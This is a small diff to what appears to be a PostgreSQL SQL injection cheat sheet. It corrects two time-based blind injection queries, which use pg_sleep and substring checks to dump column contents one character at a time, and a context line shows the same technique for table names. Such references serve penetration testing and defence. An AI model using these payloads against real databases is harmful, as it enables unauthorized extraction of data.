@@ -169,8 +169,8 @@ select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0)
 ```
 #### columns dump time based
 ```sql
-select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from column_name limit 1
-select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from column_name where column_name='value' limit 1
+select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1
+select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1
 ```
 
 
